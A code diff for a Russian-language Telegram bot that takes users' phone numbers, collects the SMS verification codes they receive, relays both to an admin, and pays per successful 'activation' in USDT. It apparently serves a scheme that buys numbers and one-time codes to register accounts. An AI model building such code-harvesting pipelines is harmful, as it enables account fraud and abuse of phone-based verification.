@@ -9,7 +9,7 @@ from aiogram.filters import Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker
 from sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column
-from sqlalchemy import BigInteger, String, Integer, Float, DateTime, inspect, select, update
+from sqlalchemy import BigInteger, String, Integer, Float, DateTime, inspect, select
 from sqlalchemy.sql import text
 import enum
 from dotenv import load_dotenv
@@ -74,6 +74,7 @@ class Order(Base):
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
     timeout_at: Mapped[datetime] = mapped_column(DateTime, nullable=True)
     completed_at: Mapped[datetime] = mapped_column(DateTime, nullable=True)
+    request_message_id: Mapped[int] = mapped_column(BigInteger, nullable=True)
 
 
 class Withdraw(Base):
@@ -103,6 +104,9 @@ async def init_db():
         await conn.run_sync(
             lambda c: add_column_if_not_exists(c, "orders", "completed_at", "TIMESTAMP")
         )
+        await conn.run_sync(
+            lambda c: add_column_if_not_exists(c, "orders", "request_message_id", "BIGINT")
+        )
 
 
 def normalize_phone(phone: str) -> str:
@@ -125,70 +129,88 @@ def format_order_tag(phone: str) -> str:
     return f"#s{digits}"
 
 
+def format_main_menu() -> str:
+    return f"""⚡️FreeLine - сервис по приему СМС на нужные вам сервисы!
+
+Наши преимущества:
+• Полная автоматизация работы, без посредника.
+• Автоматические выводы и моментальные зачисления.
+• Прозрачный сервис и отзывчивая администрация.
+
+Цена на сегодня: Ⓜ️ — 3.5$"""
+
+
+def format_profile(user_id: int, balance: float) -> str:
+    return f"""🔐 Ваш профиль:
+
+• ID: {user_id}
+• Банк: ${balance:.2f}"""
+
+
 def format_message_phone_sent(phone: str) -> str:
     tag = format_order_tag(phone)
-    return f"""<b>🔖 Активация</b> {tag}
+    return f"""<b>🖱️Обработка</b> {tag}
 
-<i>Уведомление: ⚡️ Номер передан в центр</i>"""
+<i>Статус: ⚡️Номер передан контрагенту</i>"""
 
 
 def format_message_phone_sent2(phone: str) -> str:
     tag = format_order_tag(phone)
-    return f"""<b>🔖 Активация</b> {tag}
+    return f"""<b>🖱️Обработка</b> {tag}
 
-<i>Уведомление: В течение 2-х минут вам поступит SMS на ваш номер, отправьте его ответом на это сообщение</i>"""
+<i>Статус: В течение 2-х минут вам придет СМС, отправьте его ответом на данное сообщение</i>"""
 
 
 def format_message_waiting_sms(phone: str) -> str:
     tag = format_order_tag(phone)
-    return f"""<b>📩 Активация</b> {tag}
+    return f"""<b>🖱️Обработка</b> {tag}
 
-<i>Статус: ⚡️ SMS в обработке, ожидаем ответа от центра</i>"""
+<i>Статус: ⚡️ СМС в обработке, ожидаем ответа от контрагента</i>"""
 
 
 def format_message_success(phone: str) -> str:
     tag = format_order_tag(phone)
-    return f"""<b>📩 Активация</b> {tag}
+    return f"""<b>🖱️Обработка</b> {tag}
 
-<i>Уведомление: ✅ Активация успешна</i>"""
+<i>Статус: ✅ Активация успешна</i>"""
 
 
 def format_message_balance_added(amount: float) -> str:
-    return f"""<i>🎉 На ваш баланс зачислено: {amount} USDT</i>"""
+    return f"""<i>📤 На ваш баланс зачислено: {amount} USDT</i>"""
 
 
 def format_message_rejected(phone: str) -> str:
     tag = format_order_tag(phone)
-    return f"""<b>📩 Активация</b> {tag}
+    return f"""<b>🖱️Обработка</b> {tag}
 
-<i>Уведомление: 🚫 Активация отменена</i>
+<i>Статус: 🚫 Активация отменена</i>
 
 <i>Причина: Неверный код</i>"""
 
 
 def format_message_timeout(phone: str) -> str:
     tag = format_order_tag(phone)
-    return f"""<b>🔖 Активация</b> {tag}
+    return f"""<b>🖱️Обработка</b> {tag}
 
-<i>Уведомление: 🚫 Активация отменена</i>
+<i>Статус: 🚫 Активация отменена</i>
 
-<i>Причина: Истекло фиксированное время для ввода SMS, попробуйте снова</i>"""
+<i>Причина: Истекло фиксированное время для ввода СМС, попробуйте снова</i>"""
 
 
 def format_message_error(phone: str) -> str:
     tag = format_order_tag(phone)
-    return f"""<b>📩 Активация</b> {tag}
+    return f"""<b>🖱️Обработка</b> {tag}
 
-<i>Уведомление: 🚫 Активация отменена</i>
+<i>Статус: 🚫 Активация отменена</i>
 
 <i>Причина: Произошла ошибка, попробуйте сдать номер повторно</i>"""
 
 
 def format_message_duplicate(phone: str) -> str:
     tag = format_order_tag(phone)
-    return f"""<b>🔖 Активация</b> {tag}
+    return f"""<b>🖱️Обработка</b> {tag}
 
-<i>Уведомление: 🚫 Активация отменена</i>
+<i>Статус: 🚫 Активация отменена</i>
 
 <i>Причина: Произошла ошибка, попробуйте сдать номер повторно</i>"""
 
@@ -203,27 +225,22 @@ def format_message_invalid_format() -> str:
     return """<i>Некорректный формат. Пожалуйста, отправьте номер в международном формате или используйте /leave для выхода</i>"""
 
 
-def format_main_menu(user_id: int, balance: float) -> str:
-    return f"""<b>Добро пожаловать в сервис freeHUB ⚡️</b>
-
-<i>📤 Полная автоматизация без ручного вмешательства
-⏱️ Работа 24/7 и отзывчивая администрация
-🔖 Выплаты автоматизированные, все прозрачно</i>
-
-<b>Цены:</b>
-Ⓜ️ — ${FIXED_AMOUNT}
-
-<b>💼 Ваш аккаунт</b>
-
-🆔 ID: {user_id}
-💰 Баланс: ${balance:.2f}"""
+def get_main_menu_keyboard() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="Начать работу", callback_data="start_work"),
+            InlineKeyboardButton(text="Профиль", callback_data="profile")
+        ]
+    ])
 
 
-def format_profile(user_id: int, balance: float) -> str:
-    return f"""<b>💼 Ваш аккаунт</b>
-
-🆔 ID: {user_id}
-💰 Баланс: ${balance:.2f}"""
+def get_profile_keyboard() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="Вывод", callback_data="withdraw"),
+            InlineKeyboardButton(text="Назад", callback_data="back_to_menu")
+        ]
+    ])
 
 
 async def check_phone_exists(phone: str) -> bool:
@@ -259,15 +276,14 @@ async def create_order(user_id: int, phone: str, username: str = None) -> Option
         return order
 
 
-async def get_active_order(user_id: int, phone: str = None) -> Optional[Order]:
+async def get_active_order(user_id: int) -> Optional[Order]:
     async with AsyncSessionLocal() as session:
-        query = select(Order).where(
-            Order.user_id == user_id,
-            Order.status.in_([OrderStatus.WAITING_CODE, OrderStatus.VERIFYING])
+        result = await session.execute(
+            select(Order).where(
+                Order.user_id == user_id,
+                Order.status.in_([OrderStatus.WAITING_CODE, OrderStatus.VERIFYING])
+            ).order_by(Order.created_at.desc())
         )
-        if phone:
-            query = query.where(Order.phone == phone)
-        result = await session.execute(query.order_by(Order.created_at.desc()))
         return result.scalar_one_or_none()
 
 
@@ -280,6 +296,14 @@ async def update_order_status(order_id: int, status: OrderStatus, sms_code: str 
                 order.sms_code = sms_code
             if status in [OrderStatus.COMPLETED, OrderStatus.REJECTED, OrderStatus.TIMEOUT, OrderStatus.ERROR]:
                 order.completed_at = datetime.utcnow()
+            await session.commit()
+
+
+async def update_order_message_id(order_id: int, message_id: int):
+    async with AsyncSessionLocal() as session:
+        order = await session.get(Order, order_id)
+        if order:
+            order.request_message_id = message_id
             await session.commit()
 
 
@@ -340,10 +364,11 @@ async def deduct_balance(user_id: int, amount: float) -> bool:
         return False
 
 
-async def send_delayed_message(chat_id: int, phone: str, message_type: str = "sms_request"):
+async def send_delayed_message(chat_id: int, phone: str, order_id: int, message_type: str = "sms_request"):
     await asyncio.sleep(2)
     if message_type == "sms_request":
-        await bot.send_message(chat_id, format_message_phone_sent2(phone), parse_mode="HTML")
+        msg = await bot.send_message(chat_id, format_message_phone_sent2(phone), parse_mode="HTML")
+        await update_order_message_id(order_id, msg.message_id)
     elif message_type == "error":
         await bot.send_message(chat_id, format_message_error(phone), parse_mode="HTML")
     elif message_type == "duplicate_error":
@@ -359,24 +384,6 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
 
-def get_main_menu_keyboard() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [
-            InlineKeyboardButton(text="📮 Начать работу", callback_data="start_work"),
-            InlineKeyboardButton(text="🔐 Профиль", callback_data="profile")
-        ]
-    ])
-
-
-def get_profile_keyboard() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [
-            InlineKeyboardButton(text="🎉 Вывод", callback_data="withdraw"),
-            InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")
-        ]
-    ])
-
-
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     user_id = message.from_user.id
@@ -389,11 +396,9 @@ async def cmd_start(message: types.Message):
             user = User(id=user_id, username=username, state="idle")
             session.add(user)
             await session.commit()
-        
-        balance = user.balance if user else 0.0
     
     await message.answer(
-        format_main_menu(user_id, balance),
+        format_main_menu(),
         parse_mode="HTML",
         reply_markup=get_main_menu_keyboard()
     )
@@ -409,9 +414,8 @@ async def cmd_leave(message: types.Message):
             user.state = "idle"
             await session.commit()
     
-    balance = await get_user_balance(user_id)
     await message.answer(
-        format_main_menu(user_id, balance),
+        format_main_menu(),
         parse_mode="HTML",
         reply_markup=get_main_menu_keyboard()
     )
@@ -424,7 +428,7 @@ async def start_work_callback(callback: CallbackQuery):
     await set_user_state(user_id, "waiting_phone")
     
     await callback.message.edit_text(
-        "<i>📋 В следующем сообщении отправьте номер телефона контрагенту 🇷🇺\n\nЧтобы закончить работу введите /leave</i>",
+        "В следующем сообщении отправьте номер телефона\n\nДля завершения работы введите /leave",
         parse_mode="HTML"
     )
     await callback.answer()
@@ -445,11 +449,8 @@ async def profile_callback(callback: CallbackQuery):
 
 @dp.callback_query(lambda c: c.data == "back_to_menu")
 async def back_to_menu_callback(callback: CallbackQuery):
-    user_id = callback.from_user.id
-    balance = await get_user_balance(user_id)
-    
     await callback.message.edit_text(
-        format_main_menu(user_id, balance),
+        format_main_menu(),
         parse_mode="HTML",
         reply_markup=get_main_menu_keyboard()
     )
@@ -465,22 +466,18 @@ async def withdraw_callback(callback: CallbackQuery):
         await callback.answer("❌ Недостаточно средств", show_alert=True)
         return
     
-    # Создаём заявку на вывод
     withdraw = await create_withdraw(user_id, balance)
     
-    # Отправляем админу
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="✅ ПОДТВЕРДИТЬ", callback_data=f"confirm_withdraw_{withdraw.id}"),
-            InlineKeyboardButton(text="❌ ОТКЛОНИТЬ", callback_data=f"reject_withdraw_{withdraw.id}")
+            InlineKeyboardButton(text="ПОДТВЕРДИТЬ", callback_data=f"confirm_withdraw_{withdraw.id}"),
+            InlineKeyboardButton(text="ОТКЛОНИТЬ", callback_data=f"reject_withdraw_{withdraw.id}")
         ]
     ])
     
     await bot.send_message(
         ADMIN_ID,
-        f"💰 Новая заявка на вывод #{withdraw.id}\n"
-        f"Пользователь: @{callback.from_user.username or user_id} (id: {user_id})\n"
-        f"Сумма: {balance}$",
+        f"Новая заявка на вывод #{withdraw.id}\nПользователь: @{callback.from_user.username or user_id} (id: {user_id})\nСумма: {balance}$",
         reply_markup=keyboard
     )
     
@@ -497,7 +494,6 @@ async def confirm_withdraw_callback(callback: CallbackQuery):
             await callback.answer("Заявка уже обработана")
             return
         
-        # Списываем баланс
         success = await deduct_balance(withdraw.user_id, withdraw.amount)
         if success:
             await update_withdraw_status(withdraw_id, WithdrawStatus.COMPLETED)
@@ -549,12 +545,16 @@ async def handle_message(message: types.Message):
         order = await get_active_order(user_id)
         if not order:
             return
+        
+        if message.reply_to_message.message_id != order.request_message_id:
+            await message.answer(format_message_invalid_format(), parse_mode="HTML")
+            return
 
         code = message.text.strip()
 
         if not code.isdigit() or len(code) != 6:
             await message.answer(format_message_waiting_sms(order.phone), parse_mode="HTML")
-            asyncio.create_task(send_delayed_message(message.chat.id, order.phone, "error"))
+            asyncio.create_task(send_delayed_message(message.chat.id, order.phone, order.id, "error"))
             await update_order_status(order.id, OrderStatus.ERROR)
             return
 
@@ -563,20 +563,25 @@ async def handle_message(message: types.Message):
 
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [
-                InlineKeyboardButton(text="✅ ПРИНЯТЬ", callback_data=f"accept_{order.id}_{code}"),
-                InlineKeyboardButton(text="❌ ОТКЛОНИТЬ", callback_data=f"reject_{order.id}")
+                InlineKeyboardButton(text="ПРИНЯТЬ", callback_data=f"accept_{order.id}_{code}"),
+                InlineKeyboardButton(text="ОТКЛОНИТЬ", callback_data=f"reject_{order.id}")
             ]
         ])
 
         await bot.send_message(
             ADMIN_ID,
-            f"🔐 Код для заявки #{order.id}\nНомер: {order.phone}\nКод: {code}\nПользователь: @{message.from_user.username or user_id}",
-            reply_markup=keyboard
+            f"Код для заявки #{order.id}\nНомер: `{order.phone}`\nКод: `{code}`\nПользователь: @{message.from_user.username or user_id} (id: {user_id})",
+            reply_markup=keyboard,
+            parse_mode="HTML"
         )
         return
 
-    phone_raw = message.text.strip()
-    digits = ''.join(filter(str.isdigit, phone_raw))
+    text = message.text.strip()
+    digits = ''.join(filter(str.isdigit, text))
+    
+    if len(digits) == 6 and text.isdigit():
+        await message.answer(format_message_not_reply(), parse_mode="HTML")
+        return
     
     is_phone = False
     if len(digits) >= 10 and len(digits) <= 12:
@@ -588,23 +593,23 @@ async def handle_message(message: types.Message):
         await message.answer(format_message_invalid_format(), parse_mode="HTML")
         return
 
-    phone = normalize_phone(phone_raw)
+    phone = normalize_phone(text)
     username = message.from_user.username
 
     if await check_phone_exists(phone):
         await message.answer(format_message_phone_sent(phone), parse_mode="HTML")
-        asyncio.create_task(send_delayed_message(message.chat.id, phone, "duplicate_error"))
+        asyncio.create_task(send_delayed_message(message.chat.id, phone, 0, "duplicate_error"))
         return
 
     order = await create_order(user_id, phone, username)
 
     await message.answer(format_message_phone_sent(phone), parse_mode="HTML")
-    
-    asyncio.create_task(send_delayed_message(message.chat.id, phone, "sms_request"))
+    asyncio.create_task(send_delayed_message(message.chat.id, phone, order.id, "sms_request"))
 
     await bot.send_message(
         ADMIN_ID,
-        f"📞 Новая заявка #{order.id}\nНомер: {phone}\nПользователь: @{username or user_id} (id: {user_id})"
+        f"Новая заявка #{order.id}\nНомер: `{phone}`\nПользователь: @{username or user_id} (id: {user_id})",
+        parse_mode="HTML"
     )
 
     asyncio.create_task(check_timeout(order.id, phone, user_id, message.chat.id))
